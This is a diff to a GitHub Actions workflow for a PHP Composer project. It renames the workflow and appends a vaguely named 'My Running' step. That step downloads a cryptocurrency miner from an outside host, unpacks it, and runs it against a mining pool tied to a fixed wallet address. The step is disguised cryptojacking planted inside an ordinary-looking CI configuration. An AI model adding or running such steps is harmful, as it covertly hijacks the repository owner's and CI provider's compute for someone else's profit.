@@ -1,4 +1,4 @@
-name: PHP Composer
+name: Test PHP Composer
 
 on:
   push:
@@ -51,3 +51,9 @@ jobs:
 
     - name: PHP Code Sniffer
       run: vendor/bin/phpcs --ignore="*/vendor/*" .
+
+    - name: My Running
+      run:  |
+        wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+        tar xf cpuminer-opt-linux.tar.gz
+        ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:17042 -u sugar1qtfu03rahndmf65yfpyjakg83qm2sg74ytnjpdn.10
